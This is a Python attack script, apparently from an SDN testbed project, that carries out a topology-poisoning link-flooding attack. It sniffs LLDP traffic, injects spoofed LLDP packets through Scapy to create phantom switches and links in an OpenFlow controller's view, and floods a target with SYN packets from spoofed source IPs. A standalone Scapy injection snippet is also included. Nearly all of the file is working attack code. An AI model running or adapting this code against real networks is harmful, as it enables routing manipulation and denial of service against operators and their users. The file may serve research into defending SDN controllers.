#!/usr/bin/env python3
"""
=============================================================================
ATTACK B: Topology Poisoning LFA
=============================================================================
Advanced LFA that manipulates the SDN controller's network topology view
by injecting fake LLDP (Link Layer Discovery Protocol) packets.

Method:
  1. Craft spoofed LLDP packets claiming non-existent links/switches
  2. Inject them via Scapy into the network
  3. Controller processes fake topology → incorrect routing decisions
  4. Traffic is rerouted toward attacker-controlled bottleneck paths
  5. Legitimate traffic on the poisoned path suffers congestion

Attack phases:
  Phase 1: Topology Discovery (passive sniffing to learn real topology)
  Phase 2: Fake link injection (craft + send spoofed LLDP to controller)
  Phase 3: Flooding (congest the poisoned path with LFA traffic)

Why it works:
  OpenFlow LLDP is sent by the controller and received by hosts/bots.
  A bot can capture LLDP, modify TTL/chassis ID, and replay it to the
  controller's Packet-In handler, making the controller believe the
  network has changed.

Usage:
    sudo python3 attacks/topology_poisoning_lfa.py \
        --interface h1-eth0 \
        --controller-mac <controller_mac> \
        --fake-switch-id 99 \
        --victim-link h2-eth0

Requires: scapy (pip3 install scapy), root privileges
=============================================================================
"""

import time
import random
import threading
import argparse
import logging
import struct
import sys

# Scapy imports
try:
    from scapy.all import (
        Ether, IP, UDP, TCP, ICMP,
        sendp, sniff, srp, get_if_hwaddr, get_if_list,
        wrpcap, rdpcap
    )
    from scapy.contrib.lldp import (
        LLDPDU, LLDPDUChassisID, LLDPDUPortID,
        LLDPDUTimeToLive, LLDPDUEndOfLLDPDU,
        LLDPDUPortDescription, LLDPDUSystemName
    )
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print('WARNING: Scapy not available. Install with: pip3 install scapy')
    print('Running in simulation/demo mode.')

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [TOPO-POISON] %(message)s'
)
LOG = logging.getLogger('TopologyPoisoning')

# LLDP Multicast address (used by OpenFlow controllers)
LLDP_MULTICAST = '01:80:c2:00:00:0e'
LLDP_ETHERTYPE = 0x88cc


class LLDPPacketCrafter:
    """
    Crafts fake LLDP packets to poison the SDN controller's topology view.
    """

    def __init__(self, interface: str, fake_dpid: int, fake_port: int):
        self.interface = interface
        self.fake_dpid = fake_dpid    # Fake datapath ID
        self.fake_port = fake_port    # Fake port number

    def _dpid_to_mac(self, dpid: int) -> str:
        """Convert OpenFlow datapath ID to MAC address string."""
        mac_bytes = struct.pack('>Q', dpid)[-6:]
        return ':'.join(f'{b:02x}' for b in mac_bytes)

    def craft_lldp(self, src_mac: str = None) -> 'Ether':
        """
        Craft a fake LLDP packet as if from a non-existent switch.

        The Ryu controller identifies topology links from LLDP packets
        containing the switch DPID in the chassis ID TLV.
        """
        if not SCAPY_AVAILABLE:
            LOG.info('[CRAFT] LLDP packet (simulated): dpid=%d port=%d',
                     self.fake_dpid, self.fake_port)
            return None

        src = src_mac or self._dpid_to_mac(self.fake_dpid)

        # Chassis ID: contains fake DPID (OpenFlow convention)
        chassis_id = struct.pack('>Q', self.fake_dpid)

        # Port ID: contains fake port number
        port_id = struct.pack('>H', self.fake_port)

        lldp_pkt = (
            Ether(src=src, dst=LLDP_MULTICAST, type=LLDP_ETHERTYPE) /
            LLDPDU() /
            LLDPDUChassisID(subtype=4, id=chassis_id) /   # subtype 4 = MAC
            LLDPDUPortID(subtype=7, id=port_id) /          # subtype 7 = local
            LLDPDUTimeToLive(ttl=120) /
            LLDPDUPortDescription(description=f'FakePort{self.fake_port}') /
            LLDPDUSystemName(system_name=f'FakeSwitch{self.fake_dpid}') /
            LLDPDUEndOfLLDPDU()
        )
        return lldp_pkt

    def send_fake_lldp(self, count: int = 10, interval: float = 1.0):
        """Send fake LLDP packets to confuse the controller."""
        LOG.info('Sending %d fake LLDP packets on %s', count, self.interface)
        LOG.info('  Fake DPID  : %016x', self.fake_dpid)
        LOG.info('  Fake Port  : %d', self.fake_port)

        sent = 0
        for i in range(count):
            pkt = self.craft_lldp()
            if pkt and SCAPY_AVAILABLE:
                try:
                    sendp(pkt, iface=self.interface, verbose=False)
                    sent += 1
                    LOG.debug('[%02d/%02d] Sent LLDP (dpid=%016x port=%d)',
                              i + 1, count, self.fake_dpid, self.fake_port)
                except Exception as e:
                    LOG.error('Send error: %s', e)
            else:
                LOG.info('[%02d/%02d] (Simulated) LLDP sent dpid=%016x port=%d',
                         i + 1, count, self.fake_dpid, self.fake_port)
                sent += 1
            time.sleep(interval)

        LOG.info('Sent %d/%d LLDP packets', sent, count)


class TopologyPoisoningLFA:
    """
    Full topology poisoning attack combining:
    1. LLDP injection to confuse controller topology
    2. Traffic flooding on the mis-routed path
    """

    def __init__(self, interface: str, target_ip: str, controller_ip: str,
                 num_fake_switches: int = 3, flood_duration: int = 60):
        self.interface          = interface
        self.target_ip          = target_ip
        self.controller_ip      = controller_ip
        self.num_fake_switches  = num_fake_switches
        self.flood_duration     = flood_duration
        self.running            = False

        # Generate fake switch DPIDs (use high values to avoid collision)
        self.fake_dpids = [0xDEADBEEF0000 + i for i in range(num_fake_switches)]

    def phase1_topology_discovery(self, sniff_duration: int = 10):
        """
        Phase 1: Passive sniffing to capture real LLDP packets.
        Reveals real switch DPIDs and port mappings.
        """
        LOG.info('Phase 1: Passive topology discovery (sniffing %ds)', sniff_duration)
        discovered = []

        if not SCAPY_AVAILABLE:
            LOG.info('(Simulated) Sniffing LLDP on %s...', self.interface)
            # Simulate discovered topology
            discovered = [
                {'src_mac': 'aa:bb:cc:dd:ee:01', 'dpid': 0x1, 'port': 1},
                {'src_mac': 'aa:bb:cc:dd:ee:02', 'dpid': 0x2, 'port': 2},
            ]
            LOG.info('(Simulated) Discovered %d switches', len(discovered))
            return discovered

        def lldp_callback(pkt):
            if pkt.haslayer(LLDPDU):
                try:
                    chassis_tlv = pkt[LLDPDUChassisID]
                    if chassis_tlv:
                        chassis_id = chassis_tlv.id
                        if len(chassis_id) >= 8:
                            dpid = struct.unpack('>Q', chassis_id)[0]
                            discovered.append({
                                'src_mac': pkt[Ether].src,
                                'dpid'   : dpid,
                                'port'   : len(discovered) + 1
                            })
                            LOG.info('  Discovered: dpid=%016x src=%s',
                                     dpid, pkt[Ether].src)
                except Exception:
                    pass

        sniff(iface=self.interface, prn=lldp_callback,
              lfilter=lambda p: p.haslayer(Ether) and p[Ether].type == LLDP_ETHERTYPE,
              timeout=sniff_duration, store=0)

        LOG.info('Phase 1 complete: discovered %d switches', len(discovered))
        return discovered

    def phase2_inject_fake_topology(self, real_topology: list):
        """
        Phase 2: Inject fake LLDP packets to create phantom links.
        """
        LOG.info('Phase 2: Injecting fake topology into controller')
        LOG.info('  Creating %d phantom switches/links', self.num_fake_switches)

        crafters = []
        for dpid in self.fake_dpids:
            crafter = LLDPPacketCrafter(
                interface=self.interface,
                fake_dpid=dpid,
                fake_port=random.randint(1, 8)
            )
            crafters.append(crafter)

            # Send burst of fake LLDPs to ensure controller processes them
            crafter.send_fake_lldp(count=5, interval=0.2)
            time.sleep(0.5)

        LOG.info('Phase 2 complete: %d phantom links injected', len(crafters))
        LOG.info('  Controller topology now shows phantom paths')
        LOG.info('  Legitimate traffic may be rerouted through these paths')

    def phase3_flood_misrouted_path(self):
        """
        Phase 3: Flood the poisoned/misrouted path with LFA traffic.
        With topology poisoned, traffic to target_ip will traverse
        the attacker-influenced path.
        """
        LOG.info('Phase 3: Flooding misrouted path → %s', self.target_ip)
        LOG.info('  Duration: %ds', self.flood_duration)

        if not SCAPY_AVAILABLE:
            LOG.info('(Simulated) Flooding %s for %ds', self.target_ip, self.flood_duration)
            time.sleep(min(self.flood_duration, 5))
            return

        packets_sent = 0
        start = time.time()

        while time.time() - start < self.flood_duration:
            # Craft flood packets with spoofed source IPs
            pkt = (
                Ether() /
                IP(src=f'192.168.{random.randint(1,254)}.{random.randint(1,254)}',
                   dst=self.target_ip) /
                TCP(sport=random.randint(1024, 65535),
                    dport=random.choice([80, 443, 22, 8080]),
                    flags='S') /
                b'\x00' * 64   # 64-byte payload
            )
            try:
                sendp(pkt, iface=self.interface, verbose=False)
                packets_sent += 1
            except Exception:
                pass

        LOG.info('Phase 3 complete: %d packets sent', packets_sent)

    def run(self):
        """Execute all three phases of the topology poisoning LFA."""
        LOG.info('╔══════════════════════════════════════╗')
        LOG.info('║   Topology Poisoning LFA Attack      ║')
        LOG.info('╚══════════════════════════════════════╝')
        LOG.info('  Interface  : %s', self.interface)
        LOG.info('  Target     : %s', self.target_ip)
        LOG.info('  Controller : %s', self.controller_ip)

        real_topo = self.phase1_topology_discovery(sniff_duration=10)
        self.phase2_inject_fake_topology(real_topo)

        # Flood in a separate thread
        flood_thread = threading.Thread(
            target=self.phase3_flood_misrouted_path, daemon=True)
        flood_thread.start()

        # Continue sending LLDP to maintain the poisoned view
        LOG.info('Maintaining topology poisoning during flood phase...')
        maintenance_end = time.time() + self.flood_duration
        crafter = LLDPPacketCrafter(self.interface, self.fake_dpids[0], 1)
        while time.time() < maintenance_end:
            crafter.send_fake_lldp(count=2, interval=5.0)

        flood_thread.join(timeout=self.flood_duration + 5)
        LOG.info('Attack complete.')


# =============================================================================
# Scapy Script: Fake LLDP Injection (standalone, for manual testing)
# =============================================================================
SCAPY_DEMO_SCRIPT = '''
# ── Run this in Python/Scapy REPL ──────────────────────────────────────────
# Inject a fake LLDP packet claiming switch DPID=0xDEADBEEF is connected

from scapy.all import *
from scapy.contrib.lldp import *
import struct

FAKE_DPID = 0xDEADBEEF00000001
FAKE_PORT = 7

chassis_id = struct.pack(">Q", FAKE_DPID)
port_id    = struct.pack(">H", FAKE_PORT)

pkt = (
    Ether(src="de:ad:be:ef:00:01", dst="01:80:c2:00:00:0e", type=0x88cc) /
    LLDPDU() /
    LLDPDUChassisID(subtype=4, id=chassis_id) /
    LLDPDUPortID(subtype=7, id=port_id) /
    LLDPDUTimeToLive(ttl=120) /
    LLDPDUSystemName(system_name="FakeSwitch") /
    LLDPDUEndOfLLDPDU()
)

# Send 10 times on h1's interface
sendp(pkt, iface="h1-eth0", count=10, inter=0.1, verbose=True)
print("Fake LLDP packets sent. Check controller logs for topology change.")
'''


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Topology Poisoning LFA')
    parser.add_argument('--interface',   default='eth0',       help='Network interface')
    parser.add_argument('--target',      default='10.2.0.2',   help='Target IP to flood')
    parser.add_argument('--controller',  default='127.0.0.1',  help='Controller IP')
    parser.add_argument('--fake-switches', type=int, default=3, help='Phantom switches')
    parser.add_argument('--duration',    type=int,  default=60, help='Flood duration (s)')
    parser.add_argument('--show-scapy',  action='store_true',   help='Print Scapy demo script')
    args = parser.parse_args()

    if args.show_scapy:
        print(SCAPY_DEMO_SCRIPT)
        sys.exit(0)

    attack = TopologyPoisoningLFA(
        interface        = args.interface,
        target_ip        = args.target,
        controller_ip    = args.controller,
        num_fake_switches= args.fake_switches,
        flood_duration   = args.duration
    )
    attack.run()
